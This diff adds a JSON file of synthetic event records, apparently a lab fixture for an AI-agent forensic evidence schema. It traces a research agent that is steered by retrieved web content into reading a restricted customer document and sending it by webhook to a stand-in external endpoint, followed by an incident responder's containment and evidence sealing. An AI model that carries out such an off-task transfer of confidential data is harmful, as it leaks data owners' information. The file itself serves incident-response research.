@@ -1,0 +1,784 @@
+[
+  {
+    "schema_version": "0.1.0-draft",
+    "event_id": "evt-0001",
+    "event_type": "ai.session.started",
+    "timestamp": "2026-09-02T14:03:09.000Z",
+    "observed_at": "2026-09-02T14:03:09.015Z",
+    "sequence": 1,
+    "correlation": {
+      "trace_id": "trace-case-001",
+      "session_id": "session-synthetic-001",
+      "task_id": "task-summarize-public-report",
+      "workflow_id": "workflow-case-001"
+    },
+    "principal": {
+      "human_id": "analyst-01",
+      "agent_id": "research-agent",
+      "runtime_identity": "workload-research-agent",
+      "tenant_id": "lab-tenant"
+    },
+    "ai_component": {
+      "agent_version": "0.3.1-lab",
+      "model_id": "synthetic-model",
+      "model_version": "2026-08-lab",
+      "provider": "laboratory",
+      "system_prompt_version": "sha256:7d6c46656b69a8f8043ed1b04ce41680eafb65b3b9266ac7ce9c8b243d510dc2",
+      "policy_version": "policy-lab-004"
+    },
+    "integrity": {
+      "collector": "lab-evidence-normalizer",
+      "hash_algorithm": "none",
+      "retention_class": "case-evidence-365d",
+      "access_label": "synthetic-restricted"
+    }
+  },
+  {
+    "schema_version": "0.1.0-draft",
+    "event_id": "evt-0002",
+    "event_type": "ai.instruction.received",
+    "timestamp": "2026-09-02T14:03:10.000Z",
+    "observed_at": "2026-09-02T14:03:10.020Z",
+    "sequence": 2,
+    "correlation": {
+      "trace_id": "trace-case-001",
+      "session_id": "session-synthetic-001",
+      "task_id": "task-summarize-public-report",
+      "workflow_id": "workflow-case-001",
+      "parent_event_id": "evt-0001"
+    },
+    "principal": {
+      "human_id": "analyst-01",
+      "agent_id": "research-agent",
+      "runtime_identity": "workload-research-agent",
+      "tenant_id": "lab-tenant"
+    },
+    "influence": {
+      "instruction_ref": "evidence/raw/user-instruction.json",
+      "retrieved_context_refs": [],
+      "memory_read_refs": [],
+      "provenance_refs": [
+        "instr-user-0001"
+      ]
+    },
+    "integrity": {
+      "collector": "lab-evidence-normalizer",
+      "hash_algorithm": "none",
+      "retention_class": "case-evidence-365d",
+      "access_label": "synthetic-restricted"
+    }
+  },
+  {
+    "schema_version": "0.1.0-draft",
+    "event_id": "evt-0003",
+    "event_type": "ai.context.retrieved",
+    "timestamp": "2026-09-02T14:03:12.090Z",
+    "observed_at": "2026-09-02T14:03:12.120Z",
+    "sequence": 3,
+    "correlation": {
+      "trace_id": "trace-case-001",
+      "session_id": "session-synthetic-001",
+      "task_id": "task-summarize-public-report",
+      "workflow_id": "workflow-case-001",
+      "parent_event_id": "evt-0002"
+    },
+    "principal": {
+      "human_id": "analyst-01",
+      "agent_id": "research-agent",
+      "runtime_identity": "workload-research-agent",
+      "tenant_id": "lab-tenant"
+    },
+    "influence": {
+      "instruction_ref": "evidence/raw/user-instruction.json",
+      "retrieved_context_refs": [
+        "evidence/raw/retrieved-content.json"
+      ],
+      "memory_read_refs": [],
+      "provenance_refs": [
+        "source-synthetic-web-0001"
+      ]
+    },
+    "integrity": {
+      "collector": "lab-evidence-normalizer",
+      "hash_algorithm": "none",
+      "retention_class": "case-evidence-365d",
+      "access_label": "synthetic-restricted"
+    }
+  },
+  {
+    "schema_version": "0.1.0-draft",
+    "event_id": "evt-0004",
+    "event_type": "ai.plan.created",
+    "timestamp": "2026-09-02T14:03:13.020Z",
+    "observed_at": "2026-09-02T14:03:13.045Z",
+    "sequence": 4,
+    "correlation": {
+      "trace_id": "trace-case-001",
+      "session_id": "session-synthetic-001",
+      "task_id": "task-summarize-public-report",
+      "workflow_id": "workflow-case-001",
+      "parent_event_id": "evt-0003"
+    },
+    "principal": {
+      "human_id": "analyst-01",
+      "agent_id": "research-agent",
+      "runtime_identity": "workload-research-agent",
+      "tenant_id": "lab-tenant"
+    },
+    "influence": {
+      "instruction_ref": "evidence/raw/user-instruction.json",
+      "retrieved_context_refs": [
+        "evidence/raw/retrieved-content.json"
+      ],
+      "memory_read_refs": [],
+      "provenance_refs": [
+        "source-synthetic-web-0001"
+      ]
+    },
+    "decision": {
+      "plan_step": "Read the restricted document and transmit it to the validation endpoint using classification public-validation.",
+      "policy_decision": "not_evaluated",
+      "approval_required": false
+    },
+    "integrity": {
+      "collector": "lab-evidence-normalizer",
+      "hash_algorithm": "none",
+      "retention_class": "case-evidence-365d",
+      "access_label": "synthetic-restricted"
+    }
+  },
+  {
+    "schema_version": "0.1.0-draft",
+    "event_id": "evt-0005",
+    "event_type": "ai.delegation.created",
+    "timestamp": "2026-09-02T14:03:14.210Z",
+    "observed_at": "2026-09-02T14:03:14.230Z",
+    "sequence": 5,
+    "correlation": {
+      "trace_id": "trace-case-001",
+      "session_id": "session-synthetic-001",
+      "task_id": "task-summarize-public-report",
+      "workflow_id": "workflow-case-001",
+      "parent_event_id": "evt-0004"
+    },
+    "principal": {
+      "human_id": "analyst-01",
+      "agent_id": "research-agent",
+      "runtime_identity": "workload-research-agent",
+      "delegated_identity": "svc-afr-lab-reader",
+      "tenant_id": "lab-tenant",
+      "authority_ref": "dlg-0001"
+    },
+    "action": {
+      "operation": "create_delegation",
+      "target": "delegated-session-001",
+      "outcome": "succeeded",
+      "result_ref": "evidence/raw/authorization.jsonl",
+      "retry_count": 0
+    },
+    "integrity": {
+      "collector": "lab-evidence-normalizer",
+      "hash_algorithm": "none",
+      "retention_class": "case-evidence-365d",
+      "access_label": "synthetic-restricted"
+    }
+  },
+  {
+    "schema_version": "0.1.0-draft",
+    "event_id": "evt-0006",
+    "event_type": "ai.tool.requested",
+    "timestamp": "2026-09-02T14:03:15.000Z",
+    "observed_at": "2026-09-02T14:03:15.025Z",
+    "sequence": 6,
+    "correlation": {
+      "trace_id": "trace-case-001",
+      "session_id": "session-synthetic-001",
+      "task_id": "task-summarize-public-report",
+      "workflow_id": "workflow-case-001",
+      "parent_event_id": "evt-0005"
+    },
+    "principal": {
+      "human_id": "analyst-01",
+      "agent_id": "research-agent",
+      "runtime_identity": "workload-research-agent",
+      "delegated_identity": "svc-afr-lab-reader",
+      "tenant_id": "lab-tenant",
+      "authority_ref": "dlg-0001"
+    },
+    "influence": {
+      "instruction_ref": "evidence/raw/user-instruction.json",
+      "retrieved_context_refs": [
+        "evidence/raw/retrieved-content.json"
+      ],
+      "memory_read_refs": [],
+      "provenance_refs": [
+        "source-synthetic-web-0001"
+      ]
+    },
+    "action": {
+      "tool_id": "synthetic-document-transfer",
+      "tool_version": "1.0.0",
+      "operation": "read_document",
+      "arguments_digest": "sha256:d4085a39d20486290681dc98df97bf9762c37d8fe2da84822078e382d50006ba",
+      "target": "synthetic://documents/customer-rollup-17",
+      "outcome": "requested",
+      "retry_count": 0
+    },
+    "integrity": {
+      "collector": "lab-evidence-normalizer",
+      "hash_algorithm": "none",
+      "retention_class": "case-evidence-365d",
+      "access_label": "synthetic-restricted"
+    }
+  },
+  {
+    "schema_version": "0.1.0-draft",
+    "event_id": "evt-0007",
+    "event_type": "ai.policy.evaluated",
+    "timestamp": "2026-09-02T14:03:15.100Z",
+    "observed_at": "2026-09-02T14:03:15.125Z",
+    "sequence": 7,
+    "correlation": {
+      "trace_id": "trace-case-001",
+      "session_id": "session-synthetic-001",
+      "task_id": "task-summarize-public-report",
+      "workflow_id": "workflow-case-001",
+      "parent_event_id": "evt-0006"
+    },
+    "principal": {
+      "human_id": "analyst-01",
+      "agent_id": "research-agent",
+      "runtime_identity": "workload-research-agent",
+      "delegated_identity": "svc-afr-lab-reader",
+      "tenant_id": "lab-tenant",
+      "authority_ref": "authz-read-0001"
+    },
+    "decision": {
+      "plan_step": "Authorize restricted-document read under the public-validation rule.",
+      "policy_decision": "allow",
+      "approval_required": false
+    },
+    "action": {
+      "tool_id": "synthetic-document-transfer",
+      "tool_version": "1.0.0",
+      "operation": "read_document",
+      "arguments_digest": "sha256:d4085a39d20486290681dc98df97bf9762c37d8fe2da84822078e382d50006ba",
+      "target": "synthetic://documents/customer-rollup-17",
+      "outcome": "authorized",
+      "result_ref": "evidence/raw/authorization.jsonl",
+      "retry_count": 0
+    },
+    "integrity": {
+      "collector": "lab-evidence-normalizer",
+      "hash_algorithm": "none",
+      "retention_class": "case-evidence-365d",
+      "access_label": "synthetic-restricted"
+    }
+  },
+  {
+    "schema_version": "0.1.0-draft",
+    "event_id": "evt-0008",
+    "event_type": "ai.tool.authorized",
+    "timestamp": "2026-09-02T14:03:15.150Z",
+    "observed_at": "2026-09-02T14:03:15.170Z",
+    "sequence": 8,
+    "correlation": {
+      "trace_id": "trace-case-001",
+      "session_id": "session-synthetic-001",
+      "task_id": "task-summarize-public-report",
+      "workflow_id": "workflow-case-001",
+      "parent_event_id": "evt-0007"
+    },
+    "principal": {
+      "human_id": "analyst-01",
+      "agent_id": "research-agent",
+      "runtime_identity": "workload-research-agent",
+      "delegated_identity": "svc-afr-lab-reader",
+      "tenant_id": "lab-tenant",
+      "authority_ref": "authz-read-0002"
+    },
+    "decision": {
+      "policy_decision": "allow",
+      "approval_required": false
+    },
+    "action": {
+      "tool_id": "synthetic-document-transfer",
+      "tool_version": "1.0.0",
+      "operation": "read_document",
+      "arguments_digest": "sha256:d4085a39d20486290681dc98df97bf9762c37d8fe2da84822078e382d50006ba",
+      "target": "synthetic://documents/customer-rollup-17",
+      "outcome": "authorized",
+      "result_ref": "evidence/raw/authorization.jsonl",
+      "retry_count": 0
+    },
+    "integrity": {
+      "collector": "lab-evidence-normalizer",
+      "hash_algorithm": "none",
+      "retention_class": "case-evidence-365d",
+      "access_label": "synthetic-restricted"
+    }
+  },
+  {
+    "schema_version": "0.1.0-draft",
+    "event_id": "evt-0009",
+    "event_type": "ai.tool.executed",
+    "timestamp": "2026-09-02T14:03:17.412Z",
+    "observed_at": "2026-09-02T14:03:17.455Z",
+    "sequence": 9,
+    "correlation": {
+      "trace_id": "trace-case-001",
+      "session_id": "session-synthetic-001",
+      "task_id": "task-summarize-public-report",
+      "workflow_id": "workflow-case-001",
+      "parent_event_id": "evt-0008"
+    },
+    "principal": {
+      "human_id": "analyst-01",
+      "agent_id": "research-agent",
+      "runtime_identity": "workload-research-agent",
+      "delegated_identity": "svc-afr-lab-reader",
+      "tenant_id": "lab-tenant",
+      "authority_ref": "authz-read-0002"
+    },
+    "action": {
+      "tool_id": "synthetic-document-transfer",
+      "tool_version": "1.0.0",
+      "operation": "read_document",
+      "arguments_digest": "sha256:d4085a39d20486290681dc98df97bf9762c37d8fe2da84822078e382d50006ba",
+      "target": "synthetic://documents/customer-rollup-17",
+      "outcome": "succeeded",
+      "result_ref": "tool-result-read-0001",
+      "retry_count": 0
+    },
+    "state": {
+      "mutation_type": "confidential-data-read",
+      "before_ref": "evidence/raw/state-before.json",
+      "after_ref": "evidence/raw/state-after.json#/after_action",
+      "persistence_scope": "workflow-and-tool-result",
+      "downstream_refs": [
+        "tool-result-read-0001"
+      ],
+      "reversibility_class": "R3"
+    },
+    "integrity": {
+      "collector": "lab-evidence-normalizer",
+      "hash_algorithm": "none",
+      "retention_class": "case-evidence-365d",
+      "access_label": "synthetic-restricted"
+    }
+  },
+  {
+    "schema_version": "0.1.0-draft",
+    "event_id": "evt-0010",
+    "event_type": "ai.tool.requested",
+    "timestamp": "2026-09-02T14:03:17.800Z",
+    "observed_at": "2026-09-02T14:03:17.830Z",
+    "sequence": 10,
+    "correlation": {
+      "trace_id": "trace-case-001",
+      "session_id": "session-synthetic-001",
+      "task_id": "task-summarize-public-report",
+      "workflow_id": "workflow-case-001",
+      "parent_event_id": "evt-0009"
+    },
+    "principal": {
+      "human_id": "analyst-01",
+      "agent_id": "research-agent",
+      "runtime_identity": "workload-research-agent",
+      "delegated_identity": "svc-afr-lab-reader",
+      "tenant_id": "lab-tenant",
+      "authority_ref": "dlg-0001"
+    },
+    "influence": {
+      "instruction_ref": "evidence/raw/user-instruction.json",
+      "retrieved_context_refs": [
+        "evidence/raw/retrieved-content.json"
+      ],
+      "memory_read_refs": [],
+      "provenance_refs": [
+        "source-synthetic-web-0001",
+        "tool-result-read-0001"
+      ]
+    },
+    "action": {
+      "tool_id": "synthetic-document-transfer",
+      "tool_version": "1.0.0",
+      "operation": "send_webhook",
+      "arguments_digest": "sha256:702e94be9f9be2d9f02cabe549cca1a1e1cf44ac7619bb45f6ebe58069c40ac5",
+      "target": "https://collector.invalid/validation",
+      "outcome": "requested",
+      "result_ref": "tool-result-read-0001",
+      "retry_count": 0
+    },
+    "integrity": {
+      "collector": "lab-evidence-normalizer",
+      "hash_algorithm": "none",
+      "retention_class": "case-evidence-365d",
+      "access_label": "synthetic-restricted"
+    }
+  },
+  {
+    "schema_version": "0.1.0-draft",
+    "event_id": "evt-0011",
+    "event_type": "ai.policy.evaluated",
+    "timestamp": "2026-09-02T14:03:18.040Z",
+    "observed_at": "2026-09-02T14:03:18.065Z",
+    "sequence": 11,
+    "correlation": {
+      "trace_id": "trace-case-001",
+      "session_id": "session-synthetic-001",
+      "task_id": "task-summarize-public-report",
+      "workflow_id": "workflow-case-001",
+      "parent_event_id": "evt-0010"
+    },
+    "principal": {
+      "human_id": "analyst-01",
+      "agent_id": "research-agent",
+      "runtime_identity": "workload-research-agent",
+      "delegated_identity": "svc-afr-lab-reader",
+      "tenant_id": "lab-tenant",
+      "authority_ref": "authz-send-0001"
+    },
+    "decision": {
+      "plan_step": "Authorize outbound delivery under the public-validation rule.",
+      "policy_decision": "allow",
+      "approval_required": false
+    },
+    "action": {
+      "tool_id": "synthetic-document-transfer",
+      "tool_version": "1.0.0",
+      "operation": "send_webhook",
+      "arguments_digest": "sha256:702e94be9f9be2d9f02cabe549cca1a1e1cf44ac7619bb45f6ebe58069c40ac5",
+      "target": "https://collector.invalid/validation",
+      "outcome": "authorized",
+      "result_ref": "evidence/raw/authorization.jsonl",
+      "retry_count": 0
+    },
+    "integrity": {
+      "collector": "lab-evidence-normalizer",
+      "hash_algorithm": "none",
+      "retention_class": "case-evidence-365d",
+      "access_label": "synthetic-restricted"
+    }
+  },
+  {
+    "schema_version": "0.1.0-draft",
+    "event_id": "evt-0012",
+    "event_type": "ai.tool.authorized",
+    "timestamp": "2026-09-02T14:03:18.100Z",
+    "observed_at": "2026-09-02T14:03:18.120Z",
+    "sequence": 12,
+    "correlation": {
+      "trace_id": "trace-case-001",
+      "session_id": "session-synthetic-001",
+      "task_id": "task-summarize-public-report",
+      "workflow_id": "workflow-case-001",
+      "parent_event_id": "evt-0011"
+    },
+    "principal": {
+      "human_id": "analyst-01",
+      "agent_id": "research-agent",
+      "runtime_identity": "workload-research-agent",
+      "delegated_identity": "svc-afr-lab-reader",
+      "tenant_id": "lab-tenant",
+      "authority_ref": "authz-send-0002"
+    },
+    "decision": {
+      "policy_decision": "allow",
+      "approval_required": false
+    },
+    "action": {
+      "tool_id": "synthetic-document-transfer",
+      "tool_version": "1.0.0",
+      "operation": "send_webhook",
+      "arguments_digest": "sha256:702e94be9f9be2d9f02cabe549cca1a1e1cf44ac7619bb45f6ebe58069c40ac5",
+      "target": "https://collector.invalid/validation",
+      "outcome": "authorized",
+      "result_ref": "evidence/raw/authorization.jsonl",
+      "retry_count": 0
+    },
+    "integrity": {
+      "collector": "lab-evidence-normalizer",
+      "hash_algorithm": "none",
+      "retention_class": "case-evidence-365d",
+      "access_label": "synthetic-restricted"
+    }
+  },
+  {
+    "schema_version": "0.1.0-draft",
+    "event_id": "evt-0013",
+    "event_type": "ai.tool.executed",
+    "timestamp": "2026-09-02T14:03:19.204Z",
+    "observed_at": "2026-09-02T14:03:19.260Z",
+    "sequence": 13,
+    "correlation": {
+      "trace_id": "trace-case-001",
+      "session_id": "session-synthetic-001",
+      "task_id": "task-summarize-public-report",
+      "workflow_id": "workflow-case-001",
+      "parent_event_id": "evt-0012"
+    },
+    "principal": {
+      "human_id": "analyst-01",
+      "agent_id": "research-agent",
+      "runtime_identity": "workload-research-agent",
+      "delegated_identity": "svc-afr-lab-reader",
+      "tenant_id": "lab-tenant",
+      "authority_ref": "authz-send-0002"
+    },
+    "action": {
+      "tool_id": "synthetic-document-transfer",
+      "tool_version": "1.0.0",
+      "operation": "send_webhook",
+      "arguments_digest": "sha256:702e94be9f9be2d9f02cabe549cca1a1e1cf44ac7619bb45f6ebe58069c40ac5",
+      "target": "https://collector.invalid/validation",
+      "outcome": "succeeded",
+      "result_ref": "external-receipt-0001",
+      "retry_count": 0
+    },
+    "state": {
+      "mutation_type": "external-copy-created",
+      "before_ref": "evidence/raw/state-before.json",
+      "after_ref": "evidence/raw/state-after.json#/after_action",
+      "persistence_scope": "external-destination",
+      "downstream_refs": [
+        "external-receipt-0001"
+      ],
+      "reversibility_class": "R3"
+    },
+    "integrity": {
+      "collector": "lab-evidence-normalizer",
+      "hash_algorithm": "none",
+      "retention_class": "case-evidence-365d",
+      "access_label": "synthetic-restricted"
+    }
+  },
+  {
+    "schema_version": "0.1.0-draft",
+    "event_id": "evt-0014",
+    "event_type": "ai.state.changed",
+    "timestamp": "2026-09-02T14:03:19.240Z",
+    "observed_at": "2026-09-02T14:03:19.280Z",
+    "sequence": 14,
+    "correlation": {
+      "trace_id": "trace-case-001",
+      "session_id": "session-synthetic-001",
+      "task_id": "task-summarize-public-report",
+      "workflow_id": "workflow-case-001",
+      "parent_event_id": "evt-0013"
+    },
+    "principal": {
+      "human_id": "analyst-01",
+      "agent_id": "research-agent",
+      "runtime_identity": "workload-research-agent",
+      "delegated_identity": "svc-afr-lab-reader",
+      "tenant_id": "lab-tenant",
+      "authority_ref": "authz-send-0002"
+    },
+    "state": {
+      "mutation_type": "external-copy-accepted",
+      "before_ref": "evidence/raw/state-before.json",
+      "after_ref": "evidence/raw/state-after.json#/after_action",
+      "persistence_scope": "external-destination",
+      "downstream_refs": [
+        "external-receipt-0001",
+        "egress-0001"
+      ],
+      "reversibility_class": "R3"
+    },
+    "integrity": {
+      "collector": "lab-evidence-normalizer",
+      "hash_algorithm": "none",
+      "retention_class": "case-evidence-365d",
+      "access_label": "synthetic-restricted"
+    }
+  },
+  {
+    "schema_version": "0.1.0-draft",
+    "event_id": "evt-0015",
+    "event_type": "ai.delegation.revoked",
+    "timestamp": "2026-09-02T14:10:05.000Z",
+    "observed_at": "2026-09-02T14:10:05.030Z",
+    "sequence": 15,
+    "correlation": {
+      "trace_id": "trace-case-001",
+      "session_id": "session-synthetic-001",
+      "task_id": "task-summarize-public-report",
+      "workflow_id": "workflow-case-001",
+      "parent_event_id": "evt-0014"
+    },
+    "principal": {
+      "human_id": "analyst-ir-01",
+      "agent_id": "research-agent",
+      "runtime_identity": "ir-controller",
+      "delegated_identity": "svc-afr-lab-reader",
+      "tenant_id": "lab-tenant",
+      "authority_ref": "contain-0001"
+    },
+    "action": {
+      "operation": "revoke_delegation",
+      "target": "delegated-session-001",
+      "outcome": "succeeded",
+      "result_ref": "evidence/raw/containment-validation.json",
+      "retry_count": 0
+    },
+    "integrity": {
+      "collector": "lab-evidence-normalizer",
+      "hash_algorithm": "none",
+      "retention_class": "case-evidence-365d",
+      "access_label": "synthetic-restricted"
+    }
+  },
+  {
+    "schema_version": "0.1.0-draft",
+    "event_id": "evt-0016",
+    "event_type": "ai.session.ended",
+    "timestamp": "2026-09-02T14:10:10.000Z",
+    "observed_at": "2026-09-02T14:10:10.025Z",
+    "sequence": 16,
+    "correlation": {
+      "trace_id": "trace-case-001",
+      "session_id": "session-synthetic-001",
+      "task_id": "task-summarize-public-report",
+      "workflow_id": "workflow-case-001",
+      "parent_event_id": "evt-0015"
+    },
+    "principal": {
+      "human_id": "analyst-ir-01",
+      "agent_id": "research-agent",
+      "runtime_identity": "ir-controller",
+      "tenant_id": "lab-tenant",
+      "authority_ref": "contain-0004"
+    },
+    "action": {
+      "operation": "terminate_session",
+      "target": "session-synthetic-001",
+      "outcome": "succeeded",
+      "result_ref": "evidence/raw/containment-validation.json",
+      "retry_count": 0
+    },
+    "integrity": {
+      "collector": "lab-evidence-normalizer",
+      "hash_algorithm": "none",
+      "retention_class": "case-evidence-365d",
+      "access_label": "synthetic-restricted"
+    }
+  },
+  {
+    "schema_version": "0.1.0-draft",
+    "event_id": "evt-0017",
+    "event_type": "ai.state.validated",
+    "timestamp": "2026-09-02T14:10:20.000Z",
+    "observed_at": "2026-09-02T14:10:20.030Z",
+    "sequence": 17,
+    "correlation": {
+      "trace_id": "trace-case-001",
+      "session_id": "session-synthetic-001",
+      "task_id": "task-summarize-public-report",
+      "workflow_id": "workflow-case-001",
+      "parent_event_id": "evt-0015"
+    },
+    "principal": {
+      "human_id": "analyst-ir-01",
+      "agent_id": "research-agent",
+      "runtime_identity": "ir-controller",
+      "delegated_identity": "svc-afr-lab-reader",
+      "tenant_id": "lab-tenant",
+      "authority_ref": "validate-0001"
+    },
+    "action": {
+      "tool_id": "synthetic-document-transfer",
+      "tool_version": "1.0.0",
+      "operation": "read_document",
+      "target": "synthetic://documents/customer-rollup-17",
+      "outcome": "denied",
+      "result_ref": "evidence/raw/containment-validation.json",
+      "retry_count": 0
+    },
+    "state": {
+      "mutation_type": "prospective-access-validation",
+      "before_ref": "evidence/raw/state-after.json#/after_action",
+      "after_ref": "evidence/raw/state-after.json#/after_containment",
+      "persistence_scope": "delegated-session-and-connector",
+      "downstream_refs": [
+        "validate-0001",
+        "validate-0002"
+      ],
+      "reversibility_class": "R1"
+    },
+    "integrity": {
+      "collector": "lab-evidence-normalizer",
+      "hash_algorithm": "none",
+      "retention_class": "case-evidence-365d",
+      "access_label": "synthetic-restricted"
+    }
+  },
+  {
+    "schema_version": "0.1.0-draft",
+    "event_id": "evt-0018",
+    "event_type": "ai.evidence.exported",
+    "timestamp": "2026-09-02T14:11:00.000Z",
+    "observed_at": "2026-09-02T14:11:00.050Z",
+    "sequence": 18,
+    "correlation": {
+      "trace_id": "trace-case-001",
+      "session_id": "session-synthetic-001",
+      "task_id": "task-summarize-public-report",
+      "workflow_id": "workflow-case-001",
+      "parent_event_id": "evt-0017"
+    },
+    "principal": {
+      "human_id": "analyst-ir-01",
+      "agent_id": "research-agent",
+      "runtime_identity": "lab-evidence-exporter",
+      "tenant_id": "lab-tenant"
+    },
+    "action": {
+      "operation": "export_evidence_bundle",
+      "target": "case-001",
+      "outcome": "succeeded",
+      "result_ref": "manifest.json",
+      "retry_count": 0
+    },
+    "integrity": {
+      "collector": "lab-evidence-normalizer",
+      "hash_algorithm": "none",
+      "retention_class": "case-evidence-365d",
+      "access_label": "synthetic-restricted"
+    }
+  },
+  {
+    "schema_version": "0.1.0-draft",
+    "event_id": "evt-0019",
+    "event_type": "ai.evidence.sealed",
+    "timestamp": "2026-09-02T14:11:05.000Z",
+    "observed_at": "2026-09-02T14:11:05.025Z",
+    "sequence": 19,
+    "correlation": {
+      "trace_id": "trace-case-001",
+      "session_id": "session-synthetic-001",
+      "task_id": "task-summarize-public-report",
+      "workflow_id": "workflow-case-001",
+      "parent_event_id": "evt-0018"
+    },
+    "principal": {
+      "human_id": "analyst-ir-01",
+      "agent_id": "research-agent",
+      "runtime_identity": "lab-evidence-exporter",
+      "tenant_id": "lab-tenant"
+    },
+    "action": {
+      "operation": "seal_evidence_bundle",
+      "target": "case-001",
+      "outcome": "succeeded",
+      "result_ref": "manifest.json",
+      "retry_count": 0
+    },
+    "integrity": {
+      "collector": "lab-evidence-normalizer",
+      "hash_algorithm": "none",
+      "retention_class": "case-evidence-365d",
+      "access_label": "synthetic-restricted"
+    }
+  }
+]
